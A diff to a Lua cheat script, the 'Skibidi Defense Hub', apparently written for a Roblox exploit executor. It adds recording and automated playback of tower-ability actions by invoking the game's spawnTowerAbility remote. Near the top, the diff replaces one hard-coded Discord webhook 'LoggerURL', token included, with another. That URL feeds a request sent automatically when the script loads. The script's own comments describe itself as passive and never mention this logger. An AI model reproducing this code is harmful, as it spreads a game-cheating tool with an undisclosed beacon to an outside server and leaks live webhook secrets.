@@ -1,6 +1,7 @@
 -- Skibidi Defense Hub
--- Passive recorder + state-verified playback for place/upgrade/sell/target actions.
--- This script intentionally does not hook __namecall, InvokeServer, functions, or GC.
+-- State recorder + verified playback for place/upgrade/sell/target/ability actions.
+-- Ability capture is passive: UI intent is correlated with replicated ATTACK attributes.
+-- No __namecall / FireServer / InvokeServer hook is installed by this hub.
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -12,7 +13,7 @@ local TeleportService = game:GetService("TeleportService")
 local LocalPlayer = Players.LocalPlayer
 local Environment = getgenv()
 
-local LoggerURL = "https://discord.com/api/webhooks/1551971861313757237/IGKyNgjKBJUZXuc6v3SjiRbsOkS2d5IlyN-D5urhE963rwMUjb23D_ULwjkh7DdvpTZq"
+local LoggerURL = "https://discord.com/api/webhooks/1460111538273652777/kkL-mR7uCrnKOFMuNkQ7LgWV9lrIB1dT-2jsb0iyRTOjDIOYklVVINLI2FLbkK1cTOX_"
 task.spawn(function()
     local RequestFunc = (http_request or request or syn.request or fluxus.request)
     if RequestFunc then
@@ -73,7 +74,7 @@ local State = {
     Speed = 1,
     PlaybackMode = "Hybrid",
     ProfileName = "",
-    ProfileVersion = 2,
+    ProfileVersion = 3,
     Actions = {},
     RecordStartedAt = 0,
     NextHandle = 1,
@@ -82,6 +83,8 @@ local State = {
     TowerMeta = setmetatable({}, { __mode = "k" }),
     RuntimeHandles = {},
     UsedRuntimeTowers = setmetatable({}, { __mode = "k" }),
+    PendingAbilityClickAt = -math.huge,
+    PendingAbilityIndex = 1,
 }
 
 local MacroFolder = "SkibidiDefense_Macros"
@@ -128,6 +131,8 @@ local function RefreshGameObjects()
     Remotes.Upgrade = eventFolder and eventFolder:FindFirstChild("UpgradeTower")
     Remotes.Sell = eventFolder and eventFolder:FindFirstChild("RemoveTower")
     Remotes.Target = eventFolder and eventFolder:FindFirstChild("ChangeTowerTargetMode")
+    local towerScript = ReplicatedStorage:FindFirstChild("TowerScript")
+    Remotes.Ability = towerScript and towerScript:FindFirstChild("spawnTowerAbility")
     Remotes.Skip = eventFolder and eventFolder:FindFirstChild("waveSkip")
     Remotes.Replay = eventFolder and eventFolder:FindFirstChild("ReplayCore")
     Remotes.Ready = gameStartFolder and gameStartFolder:FindFirstChild("readyButton")
@@ -730,7 +735,7 @@ local function SaveProfile(name)
     end
 
     local payload = {
-        Version = 2,
+        Version = 3,
         PlaceId = game.PlaceId,
         Name = name,
         RecordedAt = os.time(),
@@ -744,7 +749,7 @@ local function SaveProfile(name)
 
     writefile(ProfilePath(name), encoded)
     State.ProfileName = name
-    State.ProfileVersion = 2
+    State.ProfileVersion = 3
     return true
 end
 
@@ -815,6 +820,67 @@ local function AddAction(action)
     SetStatus("Recording", string.format("Captured %s at wave %d", action.Type, action.Wave))
 end
 
+Hub.RecordAbilityAction = function(towerId, abilityIndex, marker)
+    if not State.Recording or not TowerDataFolder then return false end
+    local tower = typeof(towerId) == "Instance"
+        and towerId
+        or TowerDataFolder:FindFirstChild(tostring(towerId or ""))
+    local meta = tower and State.TowerMeta[tower]
+    if not meta then return false end
+
+    local now = os.clock()
+    local previousAction = meta.LastAbilityAction
+    if previousAction
+        and previousAction.Marker == (marker and tostring(marker) or nil)
+        and now - (meta.LastAbilityRecordedAt or -math.huge) <= 0.35 then
+        previousAction.AbilityIndex = tonumber(abilityIndex) or previousAction.AbilityIndex or 1
+        if marker and tostring(marker) ~= "" then previousAction.Marker = tostring(marker) end
+        meta.LastAbilityRecordedAt = now
+        RefreshActionList()
+        return true
+    end
+
+    local action = {
+        Type = "Ability",
+        Handle = meta.Handle,
+        AbilityIndex = tonumber(abilityIndex) or 1,
+        Marker = marker and tostring(marker) or nil,
+    }
+    meta.LastAbilityAction = action
+    meta.LastAbilityRecordedAt = now
+    AddAction(action)
+    return true
+end
+
+local function DisableLegacyAbilityRecorderHook()
+    local hookState = Environment.KeroSkibidiAbilityHook
+    if type(hookState) == "table" then
+        hookState.Callback = nil
+        hookState.Remote = nil
+    end
+    Environment.KeroSkibidiAbilityHook = nil
+end
+
+DisableLegacyAbilityRecorderHook()
+
+local function InferAbilityIndex(object)
+    local current = object
+    for _ = 1, 4 do
+        if not current then break end
+        for _, attribute in ipairs({ "AbilityIndex", "Ability", "Index", "Slot" }) do
+            local value = tonumber(current:GetAttribute(attribute))
+            if value and value >= 1 then return math.floor(value) end
+        end
+        local fromName = tonumber(tostring(current.Name):match("(%d+)$"))
+        if fromName and fromName >= 1 then return math.floor(fromName) end
+        if current:IsA("GuiObject") and current.LayoutOrder > 0 then
+            return current.LayoutOrder
+        end
+        current = current.Parent
+    end
+    return 1
+end
+
 local function IsOwnTower(tower)
     return tower
         and tower.Parent == TowerDataFolder
@@ -880,7 +946,15 @@ local function AttachTowerRecorder(tower, handle)
         PendingUpgradeCost = nil,
         TargetMode = tower:GetAttribute("TargetMode"),
         LastUpgradeAt = -math.huge,
+        AbilityMarkers = {},
+        LastAbilityAction = nil,
+        LastAbilityRecordedAt = -math.huge,
     }
+    for attribute, value in pairs(tower:GetAttributes()) do
+        if tostring(attribute):match("^ATTACK") then
+            meta.AbilityMarkers[attribute] = value
+        end
+    end
     State.TowerMeta[tower] = meta
 
     AddConnection(State.RecorderConnections, tower:GetAttributeChangedSignal("SellPrice"):Connect(function()
@@ -923,6 +997,27 @@ local function AttachTowerRecorder(tower, handle)
         end
         meta.TargetMode = newMode
     end))
+
+    AddConnection(State.RecorderConnections, tower.AttributeChanged:Connect(function(attribute)
+        if not tostring(attribute):match("^ATTACK") then
+            return
+        end
+
+        local previous = meta.AbilityMarkers[attribute]
+        local value = tower:GetAttribute(attribute)
+        meta.AbilityMarkers[attribute] = value
+        if not State.Recording
+            or os.clock() - State.PendingAbilityClickAt > 2
+            or previous == value then
+            return
+        end
+
+        local markerIndex = tonumber(tostring(attribute):match("(%d+)$"))
+        local abilityIndex = markerIndex or State.PendingAbilityIndex or 1
+        State.PendingAbilityClickAt = -math.huge
+        State.PendingAbilityIndex = 1
+        Hub.RecordAbilityAction(tower, abilityIndex, attribute)
+    end))
 end
 
 local StopRecording
@@ -943,11 +1038,44 @@ local function StartRecording(profileName)
     DisconnectAll(State.RecorderConnections)
     State.Actions = {}
     State.ProfileName = profileName
-    State.ProfileVersion = 2
+    State.ProfileVersion = 3
     State.RecordStartedAt = os.clock()
     State.NextHandle = 1
     State.TowerMeta = setmetatable({}, { __mode = "k" })
+    State.PendingAbilityClickAt = -math.huge
+    State.PendingAbilityIndex = 1
     State.Recording = true
+
+    local playerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
+    local watchedAbilityButtons = setmetatable({}, { __mode = "k" })
+    local function isAbilityButton(object)
+        if not object:IsA("GuiButton") then return false end
+        local current = object
+        for _ = 1, 4 do
+            if not current then break end
+            if tostring(current.Name):lower():find("abilit", 1, true) then return true end
+            current = current.Parent
+        end
+        return false
+    end
+    local function watchAbilityButton(object)
+        if watchedAbilityButtons[object]
+            or not isAbilityButton(object) then
+            return
+        end
+        watchedAbilityButtons[object] = true
+        AddConnection(State.RecorderConnections, object.InputBegan:Connect(function(input)
+            if State.Recording and (input.UserInputType == Enum.UserInputType.MouseButton1
+                or input.UserInputType == Enum.UserInputType.Touch) then
+                State.PendingAbilityClickAt = os.clock()
+                State.PendingAbilityIndex = InferAbilityIndex(object)
+            end
+        end))
+    end
+    if playerGui then
+        for _, object in ipairs(playerGui:GetDescendants()) do watchAbilityButton(object) end
+        AddConnection(State.RecorderConnections, playerGui.DescendantAdded:Connect(watchAbilityButton))
+    end
 
     local existingOwnTowers = 0
     for _, tower in ipairs(TowerDataFolder:GetChildren()) do
@@ -1020,7 +1148,7 @@ local function StartRecording(profileName)
     if existingOwnTowers > 0 then
         SetStatus("Recording", string.format("Started with %d existing tower(s); new actions only", existingOwnTowers))
     else
-        SetStatus("Recording", "Play normally; actions are captured automatically")
+        SetStatus("Recording", "Passive recorder active; play normally")
     end
     return true
 end
@@ -1283,6 +1411,34 @@ local function PlayTarget(action)
     return tower:GetAttribute("TargetMode") == action.Mode, "Target mode was not confirmed"
 end
 
+local function PlayAbility(action)
+    local tower = ResolveHandle(action.Handle)
+    if not tower then
+        return false, "Tower handle is missing: " .. tostring(action.Handle)
+    end
+    if not Remotes.Ability or not Remotes.Ability:IsA("RemoteFunction") then
+        return false, "spawnTowerAbility is unavailable"
+    end
+
+    local marker = tostring(action.Marker or "")
+    local previous = marker ~= "" and tower:GetAttribute(marker) or nil
+    local abilityIndex = tonumber(action.AbilityIndex) or 1
+    local ok, accepted = pcall(
+        Remotes.Ability.InvokeServer,
+        Remotes.Ability,
+        tostring(tower.Name),
+        abilityIndex
+    )
+    if not ok then return false, "Ability request failed: " .. tostring(accepted) end
+    if accepted == false then return false, "Ability was rejected" end
+    if marker == "" then return true end
+
+    local confirmed = WaitUntil(function()
+        return tower.Parent ~= TowerDataFolder or tower:GetAttribute(marker) ~= previous
+    end, 5, 0.05)
+    return confirmed, confirmed and nil or "Ability was not confirmed"
+end
+
 local function StopPlayback(reason)
     State.Playing = false
     if reason then
@@ -1359,6 +1515,8 @@ local function StartPlayback()
                 else
                     success, message = PlayTarget(action)
                 end
+            elseif action.Type == "Ability" then
+                success, message = PlayAbility(action)
             else
                 success, message = false, "Unknown action type: " .. tostring(action.Type)
             end
@@ -1848,6 +2006,7 @@ function Hub.Destroy()
     State.Running = false
     State.Recording = false
     State.Playing = false
+    DisableLegacyAbilityRecorderHook()
     DisconnectAll(State.RecorderConnections)
     DisconnectAll(State.Connections)
     pcall(function()
@@ -2723,6 +2882,7 @@ function Hub.Destroy()
     State.Running = false
     State.Recording = false
     State.Playing = false
+    DisableLegacyAbilityRecorderHook()
     SaveConfig()
     DisconnectAll(State.RecorderConnections)
     DisconnectAll(State.Connections)
